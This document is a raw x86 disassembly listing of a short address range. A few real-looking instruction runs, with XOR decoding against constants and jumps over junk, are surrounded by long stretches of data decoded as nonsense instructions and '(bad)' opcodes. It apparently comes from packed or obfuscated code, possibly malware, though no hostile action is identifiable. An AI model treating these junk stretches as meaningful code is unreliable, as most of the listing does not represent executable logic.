  40a7f1:	cmp    DWORD PTR ds:0x43049e,0x8
  40a7f8:	jne    0x40a809
  40a7fe:	mov    eax,ds:0x43049e
  40a803:	inc    eax
  40a804:	mov    ds:0x43049e,eax
  40a809:	jmp    0x40a7c0
  40a80e:	mov    ecx,DWORD PTR ds:0x4304d2
  40a814:	xor    edx,edx
  40a816:	add    edx,DWORD PTR ds:0x4304d6
  40a81c:	sub    ecx,edx
  40a81e:	xor    ecx,DWORD PTR [ecx+edx*1]
  40a821:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40a828:	sbb    ecx,0x259c
  40a82e:	jmp    0x40aa29
  40a833:	imul   ebp,ecx,0x7a81ca81
  40a839:	jge    0x40a8a8
  40a83b:	dec    esp
  40a83c:	jb     0x40a8a1
  40a83e:	jmp    0x40a881
  40a840:	sbb    ch,BYTE PTR [edi]
  40a842:	popa   
  40a843:	adc    eax,0x5c7e7eeb
  40a848:	jg     0x40a8c8
  40a84a:	jle    0x40a8a7
  40a84c:	jmp    0x56bddd20
  40a851:	dec    ebp
  40a852:	test   al,0x69
  40a854:	jmp    0x40a7e3
  40a856:	outs   dx,DWORD PTR ds:[esi]
  40a857:	push   eax
  40a858:	inc    edi
  40a859:	mov    ah,0xf6
  40a85b:	rol    DWORD PTR [edi-0x69],cl
  40a85e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a85f:	or     DWORD PTR [eax+0x6f6b90de],ebx
  40a865:	and    eax,0xd4ab9997
  40a86a:	aad    0xd6
  40a86c:	xor    cl,BYTE PTR [ebp+0x6eeaceda]
  40a872:	loop   0x40a8d6
  40a874:	das    
  40a875:	jnp    0x40a8e5
  40a877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a878:	jnp    0x40a8b2
  40a87a:	fs in  eax,0xd8
  40a87d:	jns    0x40a8ab
  40a87f:	test   eax,0xafc431eb
  40a884:	lea    esi,[esi+edi*1+0x5c]
  40a888:	push   ebx
  40a889:	add    BYTE PTR [ecx+0x22c0445d],dl
  40a88f:	bound  ebx,QWORD PTR [ebx+eax*2+0x23fd637c]
  40a896:	sub    DWORD PTR [edx+0x77],esi
  40a899:	loope  0x40a8e2
  40a89b:	dec    ecx
  40a89c:	inc    esp
  40a89d:	rcl    BYTE PTR [esi],cl
  40a89f:	enter  0xd335,0x86
  40a8a3:	sahf   
  40a8a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8a5:	jns    0x40a841
  40a8a7:	mov    ah,0xe8
  40a8a9:	mov    ebx,0xa1dfdc81
  40a8ae:	(bad)  
  40a8af:	jecxz  0x40a8e3
  40a8b1:	cs loopne 0x40a8a3
  40a8b4:	sahf   
  40a8b5:	lods   eax,DWORD PTR ds:[esi]
  40a8b6:	xlat   BYTE PTR ds:[ebx]
  40a8b7:	and    eax,DWORD PTR [eax+eax*1-0x7f45e9c3]
  40a8be:	scas   eax,DWORD PTR es:[edi]
  40a8bf:	fadd   DWORD PTR [edx-0x4970a1c0]
  40a8c5:	rcr    DWORD PTR [esi+ebx*1+0x60b1941e],0xb0
  40a8cd:	jl     0x40a936
  40a8cf:	jg     0x40a8a5
  40a8d1:	sbb    esp,esi
  40a8d3:	sbb    eax,0xc90abe12
  40a8d8:	aas    
  40a8d9:	jmp    0xb3a5:0x8f0f0181
  40a8e0:	jbe    0x40a90e
  40a8e2:	or     BYTE PTR [ebx+0x2788da63],0xe2
  40a8e9:	dec    ebx
  40a8ea:	ins    DWORD PTR es:[edi],dx
  40a8eb:	stc    
  40a8ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8ed:	outs   dx,BYTE PTR ds:[esi]
  40a8ee:	in     al,0x8a
  40a8f0:	adc    ecx,DWORD PTR [ebp+0x5a]
  40a8f3:	call   0xcc53:0xbf10b4ab
  40a8fa:	lods   eax,DWORD PTR ds:[esi]
  40a8fb:	push   esi
  40a8fc:	inc    esp
  40a8fd:	sar    DWORD PTR [esp+eiz*4],cl
  40a900:	adc    ecx,DWORD PTR [ecx]
  40a902:	cmp    dh,BYTE PTR [ebx-0x10]
  40a905:	xlat   BYTE PTR ds:[ebx]
  40a906:	jb     0x40a94a
  40a908:	dec    esp
  40a909:	xor    BYTE PTR [ebp-0x55],dh
  40a90c:	outs   dx,DWORD PTR ds:[esi]
  40a90d:	dec    edi
  40a90e:	mov    eax,DWORD PTR [eax+0xa672b92]
  40a914:	in     eax,dx
  40a915:	lahf   
  40a916:	das    
  40a917:	dec    ecx
  40a918:	or     BYTE PTR ds:0x3f0105ee,ch
  40a91e:	pop    edi
  40a91f:	shr    DWORD PTR [ebx-0x589527fe],1
  40a925:	jge    0x40a8d9
  40a927:	mov    ebx,DWORD PTR [eax]
  40a929:	inc    ebp
  40a92a:	xor    ch,BYTE PTR [ecx+0xb63317e]
  40a930:	jne    0x40a904
  40a932:	push   ds
  40a933:	js     0x40a912
  40a935:	loopne 0x40a8ee
  40a937:	mov    ebp,eax
  40a939:	xor    DWORD PTR [ecx-0x646607f7],ebx
  40a93f:	adc    esi,esi
  40a941:	test   eax,0xa9f7cfee
  40a946:	mov    dh,0x7b
  40a948:	mov    dl,0x94
  40a94a:	fisttp DWORD PTR [ecx]
  40a94c:	(bad)  ds:0xe7a2ef6
  40a952:	call   0xb03d:0x72d4540e
  40a959:	div    cl
  40a95b:	movq   mm1,QWORD PTR [ebx]
  40a95e:	loopne 0x40a8e5
  40a960:	mov    al,BYTE PTR [ebx]
  40a962:	fld    DWORD PTR [edi+0x26]
  40a965:	out    dx,al
  40a966:	push   eax
  40a967:	div    DWORD PTR [ebx+ebx*8]
  40a96a:	mov    edx,edx
  40a96c:	cmp    edi,esp
  40a96e:	pop    es
  40a96f:	fsub   QWORD PTR [eax+0x54a5674c]
  40a975:	and    DWORD PTR gs:[edi+ebp*8],esp
  40a979:	in     al,0xa1
  40a97b:	jae    0x40a994
  40a97d:	xchg   ebp,eax
  40a97e:	or     DWORD PTR [edi+0x7967026c],edi
  40a984:	call   0xb1b8:0x3a2dbc40
  40a98b:	mov    edx,0xc3f9aaba
  40a990:	push   ss
  40a991:	int3   
  40a992:	mov    edi,0xc349697f
  40a997:	das    
  40a998:	sub    esi,edi
  40a99a:	ret    0x87de
  40a99d:	imul   dl
  40a99f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9a0:	shl    BYTE PTR [eax+0x6b011325],cl
  40a9a6:	enter  0xe36b,0xe0
  40a9aa:	int3   
  40a9ab:	and    DWORD PTR [ebp+0x34ce733c],0xffffffb8
  40a9b2:	pop    es
  40a9b3:	aam    0x77
  40a9b5:	jns    0x40a981
  40a9b7:	mov    dh,0x85
  40a9b9:	inc    ecx
  40a9ba:	mov    WORD PTR [edx-0x2c1da58f],?
  40a9c0:	mov    cs,WORD PTR [edx]
  40a9c2:	xchg   DWORD PTR [eax+eax*1],ebx
  40a9c5:	jae    0x40a96c
  40a9c7:	pop    ss
  40a9c8:	dec    eax
  40a9c9:	ss (bad) 
  40a9cb:	jmp    0x40a9d4
  40a9cd:	retf   
  40a9ce:	lea    ecx,[edx+0x55]
  40a9d1:	fist   DWORD PTR [ebp+esi*8-0x54]
  40a9d5:	fcomp  DWORD PTR [eax+0x1723f1e]
  40a9db:	inc    edx
  40a9dc:	mov    ds:0xb47e8c7a,al
  40a9e1:	out    0x5,eax
  40a9e3:	pop    DWORD PTR [edi-0xf]
  40a9e6:	xchg   esi,eax
  40a9e7:	adc    esi,DWORD PTR [ecx+0x15f2d9b4]
  40a9ed:	outs   dx,DWORD PTR ds:[esi]
  40a9ee:	lods   eax,DWORD PTR ds:[esi]
  40a9ef:	loopne 0x40aa4b
  40a9f1:	(bad)  
  40a9f2:	jb     0x40aa2e
  40a9f4:	dec    ecx
  40a9f5:	(bad)  
  40a9f6:	ret    0x5a03
  40a9f9:	sbb    eax,0xe0b5fed9
  40a9fe:	and    al,0x19
  40aa00:	(bad)  
  40aa01:	clc    
  40aa02:	push   0xef12582a
  40aa07:	xor    edx,DWORD PTR [ecx+ecx*1+0x6de2d04e]
  40aa0e:	in     eax,dx
  40aa0f:	mov    ch,0xcf
  40aa11:	loopne 0x40aa56
  40aa13:	test   al,0x78
  40aa15:	scas   eax,DWORD PTR es:[edi]
  40aa16:	add    ah,ah
  40aa18:	mov    eax,0xb37f40c8
  40aa1d:	fistp  WORD PTR [ecx-0x14b88f2e]
  40aa23:	dec    esi
  40aa24:	and    al,0x2c
  40aa26:	sub    eax,0x45c700fe
  40aa2b:	cld    
  40aa2c:	xor    al,BYTE PTR [ebp-0x2ef40764]
  40aa32:	mov    eax,DWORD PTR [ebp-0x4]
  40aa35:	push   esi
  40aa36:	or     ecx,edx
  40aa38:	mov    esi,DWORD PTR [ebp-0x8]
  40aa3b:	add    ecx,ecx
  40aa3d:	mov    edx,0x7510856
  40aa42:	xor    eax,edx
  40aa44:	xor    DWORD PTR ds:0x42e762,0x78fe
  40aa4e:	xor    esi,edx
  40aa50:	dec    ecx
  40aa51:	mov    ecx,0x32729d
  40aa56:	add    esi,ecx
  40aa58:	add    DWORD PTR ds:0x43055a,0x42e762
  40aa62:	add    eax,ecx
  40aa64:	imul   eax,esi
  40aa67:	mov    esi,DWORD PTR [ebp+0xc]
  40aa6a:	mov    DWORD PTR ds:0x42e75a,0x6fc4
  40aa74:	cmp    esi,eax
  40aa76:	mov    DWORD PTR ds:0x430556,0x4d9
  40aa80:	jne    0x40ae92
  40aa86:	mov    eax,DWORD PTR [ebp-0x4]
  40aa89:	mov    esi,DWORD PTR [ebp-0x8]
  40aa8c:	jmp    0x40ac87
  40aa91:	fisubr DWORD PTR [ebp-0x80]
  40aa94:	cld    
  40aa95:	mov    eax,ds:0x406d7afd
  40aa9a:	adc    DWORD PTR [ecx-0x7],esp
  40aa9d:	push   cs
  40aa9e:	jge    0x40aa7d
  40aaa0:	loop   0x40ab15
  40aaa2:	in     eax,dx
  40aaa3:	jle    0x40ab23
  40aaa5:	pop    esp
  40aaa6:	jg     0x40ab26
  40aaa8:	jle    0x40aad1
  40aaaa:	push   edx
  40aaab:	mov    bh,0xd5
  40aaad:	mov    dl,0x53
  40aaaf:	icebp  
  40aab0:	mov    al,0x38
  40aab2:	aas    
  40aab3:	idiv   dh
  40aab5:	test   DWORD PTR [ecx],edx
  40aab7:	arpl   sp,cx
  40aab9:	mov    bl,0x9f
  40aabb:	dec    edx
  40aabc:	ja     0x40aa71
  40aabe:	jmp    DWORD PTR [ebx+edx*2]
  40aac1:	ret    
  40aac2:	inc    esp
  40aac3:	sub    eax,0x8adc33e4
  40aac8:	sbb    DWORD PTR [ebp-0x62ae18dc],ebx
  40aace:	xchg   ebp,eax
  40aacf:	call   0x8811:0x2fe1307b
  40aad6:	lods   al,BYTE PTR ds:[esi]
  40aad7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aad8:	popf   
  40aad9:	ins    DWORD PTR es:[edi],dx
  40aada:	add    ecx,edi
  40aadc:	cmp    eax,0x410ffb70
  40aae1:	pushf  
  40aae2:	stos   BYTE PTR es:[edi],al
  40aae3:	loop   0x40aaef
  40aae5:	dec    esp
  40aae6:	add    WORD PTR [edi+0x39],sp
  40aaea:	inc    ebp
  40aaeb:	(bad)  
  40aaec:	fsub   st,st(5)
  40aaee:	test   al,0xfc
  40aaf0:	ss leave 
  40aaf2:	sub    al,0x55
  40aaf4:	sar    DWORD PTR [edx-0x220fb19a],1
  40aafa:	inc    eax
  40aafb:	mov    dh,0x3c
  40aafd:	sbb    DWORD PTR [eax-0x3],ebx
  40ab00:	adc    eax,0xd8d8144b
  40ab05:	(bad)  
  40ab08:	add    al,0x7c
  40ab0a:	mov    edi,0x2ac681d4
  40ab0f:	mov    ebp,0xbf7fc7d2
  40ab14:	loope  0x40ab13
  40ab16:	mov    edi,0xf9dbdfb0
  40ab1b:	xchg   edi,eax
  40ab1c:	call   0x5891abb5
  40ab21:	pop    ecx
  40ab22:	rol    DWORD PTR [edx-0x208ab87],cl
  40ab28:	and    esi,DWORD PTR [esi-0x6b39f7b2]
  40ab2e:	rcl    edx,0x5a
  40ab31:	aaa    
  40ab32:	retf   
  40ab33:	lea    edx,[edx-0x1936878d]
  40ab39:	sbb    al,0x1
  40ab3b:	xor    edx,DWORD PTR [esi-0x73]
  40ab3e:	in     eax,dx
  40ab3f:	mov    eax,0xfabf442e
  40ab44:	sbb    bl,BYTE PTR [ebp-0x23e3aa76]
  40ab4a:	pop    esi
  40ab4b:	ja     0x40ab01
  40ab4d:	imul   ah
  40ab4f:	mov    WORD PTR [esi-0x4fed571f],?
  40ab55:	out    0xe2,al
  40ab57:	or     ch,BYTE PTR [ecx-0x47d2d232]
  40ab5d:	mov    ds:0xa42bd29d,al
  40ab62:	adc    edx,DWORD PTR [ebx+0x21]
  40ab65:	(bad)  
  40ab66:	fiadd  DWORD PTR [esi+0x11]
  40ab69:	popf   
  40ab6a:	adc    bh,cl
  40ab6c:	jae    0x40aaff
  40ab6e:	enter  0xaf01,0x97
  40ab72:	fidivr WORD PTR [esi]
  40ab74:	mov    ebp,0x191a4ae2
  40ab79:	or     eax,0xa8b59d0b
  40ab7e:	mov    cl,0x6b
  40ab80:	mov    eax,ds:0x4d7384c3
  40ab85:	adc    DWORD PTR [eax-0x19],ebx
  40ab88:	retf   0x251f
  40ab8b:	push   ss
  40ab8c:	iret   
  40ab8d:	ret    
  40ab8e:	xchg   esi,eax
  40ab8f:	shl    DWORD PTR [ebp+ebp*8-0x55],0x6a
  40ab94:	test   ah,cl
  40ab96:	ins    BYTE PTR es:[edi],dx
  40ab97:	test   esi,0xc37474f5
  40ab9d:	call   0xaa12:0x48860dcc
  40aba4:	lea    edi,[ecx-0x7594a8ab]
  40abaa:	ss out dx,eax
  40abac:	dec    esp
  40abad:	hlt    
  40abae:	inc    edx
  40abaf:	jmp    0x94a7:0x42efa4dd
  40abb6:	(bad)  
  40abb7:	jnp    0x40ab51
  40abb9:	js     0x40ac0d
  40abbb:	int3   
  40abbc:	adc    al,0x87
  40abbe:	popa   
  40abbf:	popf   
  40abc0:	data16 or BYTE PTR [esi+0x5f],dh
  40abc4:	outs   dx,DWORD PTR ds:[esi]
  40abc5:	xor    DWORD PTR [edx+esi*1],ebp
  40abc8:	xor    edx,eax
  40abca:	pop    ebp
  40abcb:	cs push 0x42
  40abce:	not    BYTE PTR [bx-0x7e]
  40abd2:	loope  0x40ab7e
  40abd4:	sbb    dl,BYTE PTR [ecx+0x156e01b5]
  40abda:	cmp    DWORD PTR [edi+0x38],esp
  40abdd:	clc    
  40abde:	ins    DWORD PTR es:[edi],dx
  40abdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abe0:	mov    bh,0x55
  40abe2:	xor    ebx,DWORD PTR [edx-0x11]
  40abe5:	push   0x93ede637
  40abea:	(bad)  [ebx+0x285f4bc7]
  40abf0:	hlt    
  40abf1:	pop    ecx
  40abf2:	jmp    0x40ab75
  40abf4:	cmp    ecx,edi
  40abf6:	mov    dl,BYTE PTR [esi-0x213bb681]
  40abfc:	add    ah,BYTE PTR ds:0xaa62e93b
  40ac02:	stos   DWORD PTR es:[edi],eax
  40ac03:	sub    eax,0xe26bffbf
  40ac08:	mov    eax,ds:0x5c944196
  40ac0d:	mov    eax,0xe766406f
  40ac12:	and    BYTE PTR [ebp-0x1b],cl
  40ac15:	sbb    BYTE PTR [esi+ebx*8+0x38730196],bl
  40ac1c:	mov    cl,0xee
  40ac1e:	pop    ss
  40ac1f:	loop   0x40ac19
  40ac21:	(bad)
  40ac24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac25:	call   0x3918:0xe453c37d
  40ac2c:	add    ebx,DWORD PTR [edx]
  40ac2e:	in     eax,0x4b
  40ac30:	dec    edi
  40ac31:	jecxz  0x40ac29
  40ac33:	mov    cl,0xad
  40ac35:	jb     0x40ac6d
  40ac37:	ds ins BYTE PTR es:[edi],dx
  40ac39:	stc    
  40ac3a:	ficomp DWORD PTR [edi+0x4bd8c6f9]
  40ac40:	in     al,dx
  40ac41:	data16 sti 
  40ac43:	imul   esp,DWORD PTR [esi+0x50f4d190],0x95d0620e
  40ac4d:	data16 jno 0x40acbf
  40ac50:	push   0x25
  40ac52:	jmp    0xb6be:0xbdc43821
  40ac59:	xor    al,0x5d
  40ac5b:	or     eax,0xc50ec8e7
  40ac60:	cs push esi
  40ac62:	in     al,0xf3
  40ac64:	sti    
  40ac65:	leave  
  40ac66:	mov    dh,0x4f
  40ac68:	cmp    ecx,DWORD PTR [esp+ecx*1-0x526ec884]
  40ac6f:	mov    ds:0x9b5b00e7,al
  40ac74:	clc    
  40ac75:	cmp    DWORD PTR [ecx+0x4c],esi
  40ac78:	jbe    0x40ac72
  40ac7a:	enter  0xdbd3,0x8c
  40ac7e:	mov    ebp,0xc2807d53
  40ac83:	int3   
  40ac84:	fwait
  40ac85:	stos   BYTE PTR es:[edi],al
  40ac86:	scas   al,BYTE PTR es:[edi]
  40ac87:	xor    eax,edx
  40ac89:	xor    esi,edx
  40ac8b:	add    eax,ecx
  40ac8d:	jmp    0x40ae88
  40ac92:	pop    ebp
  40ac93:	icebp  
  40ac94:	lds    esp,FWORD PTR [eax-0x23]
  40ac97:	fs jge 0x40ac47
  40ac9a:	xchg   edi,eax
  40ac9b:	imul   ebx,edx,0x18e96d02
  40aca1:	pop    esi
  40aca2:	push   ecx
  40aca3:	out    dx,al
  40aca4:	jle    0x40ad24
  40aca6:	pop    esp
  40aca7:	jg     0x40ad27
  40aca9:	jle    0x40aca9
  40acab:	mov    dl,0x4d
  40acad:	sbb    bh,BYTE PTR [eax]
  40acaf:	arpl   WORD PTR [ebx+0x56],si
  40acb2:	dec    ebp
  40acb3:	ret    0xd45b
  40acb6:	or     ebp,DWORD PTR [ebx-0x30]
  40acb9:	aad    0x37
  40acbb:	mov    ss,esp
  40acbd:	add    DWORD PTR [edx-0x42],edi
  40acc0:	ret    
  40acc1:	call   0xc90fe482
  40acc6:	std    
  40acc7:	mov    ds:0x883803e,eax
  40accc:	xchg   esi,eax
  40accd:	outs   dx,DWORD PTR ds:[esi]
  40acce:	repz dec esp
  40acd0:	addr16 jae 0x40ac77
  40acd3:	dec    eax
  40acd4:	push   edi
  40acd5:	sub    BYTE PTR gs:[bx+si],0x4e
  40acda:	inc    edi
  40acdb:	push   ds
  40acdc:	das    
  40acdd:	les    esp,FWORD PTR cs:[ebx]
  40ace0:	in     eax,dx
  40ace1:	dec    edx
  40ace2:	lahf   
  40ace3:	pushf  
  40ace4:	adc    al,0x3c
  40ace6:	sbb    al,0x6b
  40ace8:	jae    0x40ad23
  40acea:	and    BYTE PTR [ecx],al
  40acec:	cs fs jmp 0x732d:0x166073b3
  40acf5:	cmp    eax,0x7451b898
  40acfa:	xchg   esi,eax
  40acfb:	(bad)  
  40acfc:	sub    bl,cl
  40acfe:	jmp    0xd1370868
  40ad03:	sub    bh,BYTE PTR [edi-0x49d5b62f]
  40ad09:	pop    ds
  40ad0a:	cmp    bh,BYTE PTR [edi+ecx*8+0x2f234d4b]
  40ad11:	jp     0x40ad5a
  40ad13:	test   BYTE PTR ds:0x972da1af,dl
  40ad19:	jbe    0x40ad3f
  40ad1b:	addr16 xchg esp,eax
  40ad1d:	and    ah,BYTE PTR [esi]
  40ad1f:	pop    es
  40ad20:	repz jmp 0x40ad4e
  40ad23:	ficom  WORD PTR [eax-0x5caa3a6f]
  40ad29:	bound  ebx,QWORD PTR [esi]
  40ad2b:	pop    eax
  40ad2c:	push   esi
  40ad2d:	sahf   
  40ad2e:	fucom  st(4)
  40ad30:	fcmove st,st(0)
  40ad32:	mov    edi,0xdfd342d6
  40ad37:	jae    0x40ad61
  40ad39:	idiv   DWORD PTR [ebx+0x31d45214]
  40ad3f:	ror    DWORD PTR [edi-0x75],1
  40ad42:	aam    0x31
  40ad44:	dec    ecx
  40ad45:	mov    ebx,0xe9b3131a
  40ad4a:	stos   BYTE PTR es:[edi],al
  40ad4b:	xlat   BYTE PTR ds:[ebx]
  40ad4c:	scas   eax,DWORD PTR es:[edi]
  40ad4d:	and    BYTE PTR [edi+0x7be644e],dl
  40ad53:	mov    ds:0x3357644e,eax
  40ad58:	retf   
  40ad59:	inc    ecx
  40ad5a:	and    BYTE PTR [ecx],al
  40ad5c:	push   ecx
  40ad5d:	xor    BYTE PTR [eax-0x55],ah
  40ad60:	mov    bh,cl
  40ad62:	imul   eax,DWORD PTR [esi],0xa4d8bc5c
  40ad68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad69:	nop
  40ad6a:	call   0x4ebe34c5
  40ad6f:	cli    
  40ad70:	pop    esi
  40ad71:	std    
  40ad72:	push   ss
  40ad73:	add    BYTE PTR [ebp+0x31],cl
  40ad76:	add    eax,0x63a9a348
  40ad7b:	ficom  DWORD PTR [ecx]
  40ad7d:	lea    edi,[edi-0x56ed8d93]
  40ad83:	inc    ecx
  40ad84:	mov    ebx,0x8d9c0fbd
  40ad89:	jmp    0x40ad1c
  40ad8b:	(bad)  
  40ad8c:	call   0x68f6ef34
  40ad91:	push   eax
  40ad92:	fwait
  40ad93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad94:	loopne 0x40ad6a
  40ad96:	add    DWORD PTR [ebx+0x1c],0x4432cf44
  40ad9d:	aaa    
  40ad9e:	cmp    ecx,DWORD PTR [ebx+0x2294f6df]
  40ada4:	repnz bound ebx,QWORD PTR [edx]
  40ada7:	sbb    eax,0x55467459
  40adac:	cmp    DWORD PTR [ebx-0x4d],ebx
  40adaf:	push   esp
  40adb0:	popf   
  40adb1:	daa    
  40adb2:	and    eax,0x33b48ac
  40adb7:	lock adc al,0x2b
  40adba:	(bad)  
  40adbc:	push   esi
  40adbd:	dec    edx
  40adbe:	dec    esi
  40adbf:	sbb    ebx,0xffffffdd
  40adc2:	and    DWORD PTR [edx-0x5ea3114],ebx
  40adc8:	pop    ecx
  40adc9:	mov    ds:0x38664b82,eax
  40adce:	and    eax,0x2fec8159
  40add3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40add4:	xor    eax,0x3b994644
  40add9:	lods   al,BYTE PTR ds:[esi]
  40adda:	loope  0x40ad60
  40addc:	jb     0x40adb5
  40adde:	lods   al,BYTE PTR ds:[esi]
  40addf:	jne    0x40ad6e
  40ade1:	loopne 0x40addf
  40ade3:	outs   dx,DWORD PTR ds:[esi]
  40ade4:	push   cs
  40ade5:	adc    eax,0xf3696596
  40adea:	in     al,0x80
  40adec:	xchg   ebx,eax
  40aded:	or     al,0x7d
  40adef:	sbb    bh,BYTE PTR cs:[edx+0x67ccdf1]
  40adf6:	iret   
  40adf7:	pop    ecx
  40adf8:	aam    0xb6
  40adfa:	xor    bl,0x31
  40adfd:	arpl   WORD PTR [ecx],ax
  40adff:	dec    ebp
  40ae00:	(bad)
  40ae03:	mov    bl,0x3c
  40ae05:	int    0xed
  40ae07:	cmp    edx,DWORD PTR [eax]
  40ae09:	and    BYTE PTR [esi-0x31],ah
  40ae0c:	ins    BYTE PTR es:[edi],dx
  40ae0d:	shl    BYTE PTR [esi],1
  40ae0f:	icebp  
  40ae10:	sbb    BYTE PTR ds:0x97bf273f,ah
  40ae16:	inc    ecx
  40ae17:	fsubrp st(7),st
  40ae19:	mov    ds:0x6a42204,al
  40ae1e:	mov    esi,0x952d21db
  40ae23:	retf   
  40ae24:	cmp    al,0xa0
  40ae26:	loop   0x40add6
  40ae28:	test   BYTE PTR [edi+0x57],dl
  40ae2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae2c:	push   edx
  40ae2d:	and    dl,al
  40ae2f:	lods   eax,DWORD PTR ds:[esi]
  40ae30:	mov    eax,ds:0x83e3a3bc
  40ae35:	in     eax,dx
  40ae36:	jl     0x40ae3f
  40ae38:	(bad)  
  40ae39:	rcr    BYTE PTR ds:0x41bfa17d,cl
  40ae3f:	add    BYTE PTR [esi+0x4c],bl
  40ae42:	dec    ebp
  40ae43:	test   eax,0x76b2be2a
  40ae48:	jo     0x40ae82
  40ae4a:	jecxz  0x40aea1
  40ae4c:	sahf   
  40ae4d:	(bad)  
  40ae4e:	or     esp,DWORD PTR cs:[ecx+0x62]
  40ae52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae53:	cmp    al,0x14
  40ae55:	inc    ebp
  40ae56:	jecxz  0x40aea8
  40ae58:	jne    0x40aec3
  40ae5a:	adc    BYTE PTR [eax],bh
  40ae5c:	(bad)  
  40ae5d:	cmc    
  40ae5e:	adc    al,0xd4
  40ae60:	cld    
  40ae61:	cdq    
  40ae62:	mov    WORD PTR [ecx+0x78],gs
  40ae65:	dec    edi
  40ae66:	int3   
  40ae67:	sub    BYTE PTR [ecx],dh
  40ae69:	ins    BYTE PTR es:[edi],dx
  40ae6a:	dec    esp
  40ae6b:	jp     0x40ae6c
  40ae6d:	jns    0x40aeae
  40ae6f:	popa   
  40ae70:	cmp    BYTE PTR [esi-0x41e162f6],0xcb
  40ae77:	cmp    BYTE PTR [ebx],dh
  40ae79:	or     ebp,eax
  40ae7b:	mov    ebp,0x6008ba41
  40ae80:	aaa    
  40ae81:	repz shl DWORD PTR [ebx],1
  40ae84:	push   edx
  40ae85:	ss adc bl,ch
  40ae88:	add    esi,ecx
  40ae8a:	imul   eax,esi
  40ae8d:	jmp    0x40b2c3
  40ae92:	mov    eax,DWORD PTR [ebp+0xc]
  40ae95:	mov    eax,DWORD PTR [eax+0x78]
  40ae98:	mov    DWORD PTR [ebp+0xc],eax
  40ae9b:	mov    eax,DWORD PTR [ebp-0x4]
  40ae9e:	mov    esi,DWORD PTR [ebp-0x8]
  40aea1:	jmp    0x40b09c
  40aea6:	aad    0xc4
  40aea8:	outs   dx,DWORD PTR ds:[esi]
  40aea9:	mov    BYTE PTR [edi-0x53],ch
  40aeac:	std    
  40aead:	jge    0x40af09
  40aeaf:	outs   dx,DWORD PTR ds:[esi]
  40aeb0:	stos   DWORD PTR es:[edi],eax
  40aeb1:	lock push es
  40aeb3:	mov    DWORD PTR [edi+0x7ee0bf85],ebx
  40aeb9:	jle    0x40af17
  40aebb:	jg     0x40af3b
  40aebd:	jle    0x40af34
  40aebf:	jae    0x40aef6
  40aec1:	(bad)  
  40aec2:	adc    al,0xac
  40aec4:	ret    0x1625
  40aec7:	inc    eax
  40aec8:	lods   al,BYTE PTR ds:[esi]
  40aec9:	jle    0x40ae85
  40aecb:	clc    
  40aecc:	pop    eax
  40aecd:	iret   
  40aece:	popf   
  40aecf:	mov    ecx,0xb7b6312d
  40aed4:	cmp    BYTE PTR [edx],0x48
  40aed7:	jo     0x40aed4
  40aed9:	xchg   ecx,eax
  40aeda:	jne    0x40af09
  40aedc:	fwait
  40aedd:	out    dx,al
  40aede:	cdq    
  40aedf:	out    dx,eax
  40aee0:	aam    0xc2
  40aee2:	pop    esi
  40aee3:	sti    
  40aee4:	aad    0xe0
  40aee6:	adc    DWORD PTR [edx-0x57b6638a],esp
  40aeec:	je     0x40aecc
  40aeee:	(bad)  
  40aeef:	out    dx,eax
  40aef0:	or     BYTE PTR [esi+0x28dcd285],ch
  40aef6:	jo     0x40ae7b
  40aef8:	inc    eax
  40aef9:	mov    ds:0xa12b76be,al
  40aefe:	add    dl,BYTE PTR [ebx+0x3b]
  40af01:	outs   dx,BYTE PTR ds:[esi]
  40af02:	iret   
  40af03:	test   eax,0x1d0578c5
  40af08:	rcl    DWORD PTR [eax-0x5e],cl
  40af0b:	in     al,0xa2
  40af0d:	add    eax,0x7e732ec4
  40af12:	cmp    eax,0x62fbe390
  40af17:	shl    DWORD PTR [ebx+ecx*2],0xa4
  40af1b:	inc    ecx
  40af1c:	mov    ch,0xd2
  40af1e:	fs jge 0x40aea9
  40af21:	in     al,0x55
  40af23:	call   0xace9:0x3982b1cc
  40af2a:	mov    bh,0xf8
  40af2c:	xlat   BYTE PTR ds:[ebx]
  40af2d:	arpl   WORD PTR [edi],si
  40af2f:	mov    esp,ebp
  40af31:	aas    
  40af32:	out    dx,al
  40af33:	addr16 dec esi
  40af35:	nop
  40af36:	mov    ebx,0x124c8154
  40af3b:	jno    0x40afa9
  40af3d:	fmul   DWORD PTR [edx+0x72]
  40af40:	pop    esi
  40af41:	xchg   edi,eax
  40af42:	mov    DWORD PTR [eax-0x5122120a],0x3331b8c8
  40af4c:	test   DWORD PTR [ebx],0x8c0572f8
  40af52:	cwde   
  40af53:	hlt    
  40af54:	sbb    eax,0x4311bb36
  40af59:	xchg   edx,eax
  40af5a:	bound  edx,QWORD PTR [ebx]
  40af5c:	pop    esp
  40af5d:	retf   0x446
  40af60:	sbb    BYTE PTR [eax-0x62640aba],bl
  40af66:	fdiv   DWORD PTR [edx+0x46cf8655]
  40af6c:	jge    0x40af1f
  40af6e:	dec    esi
  40af6f:	(bad)  
  40af70:	rcl    DWORD PTR [edi+0x20ff97f8],1
  40af76:	mov    DWORD PTR [esi-0x47ed37f4],ebp
  40af7c:	adc    bh,bh
  40af7e:	inc    ebx
  40af7f:	cld    
  40af80:	out    0x1c,eax
  40af82:	cmp    DWORD PTR [edi+0x1b19fd79],edi
  40af88:	mov    gs,WORD PTR [ecx+0x4aac7aa]
  40af8e:	icebp  
  40af8f:	add    esp,ebp
  40af91:	fiadd  DWORD PTR [ebp-0x37]
  40af94:	call   0x7a75:0x48a25037
  40af9b:	enter  0x3d78,0xe6
  40af9f:	pushf  
  40afa0:	pop    edi
  40afa1:	mov    ch,0x6d
  40afa3:	jmp    0xf563:0xce4cb941
  40afaa:	aaa    
  40afab:	(bad)  
  40afac:	sbb    DWORD PTR [ecx+eax*8],ebx
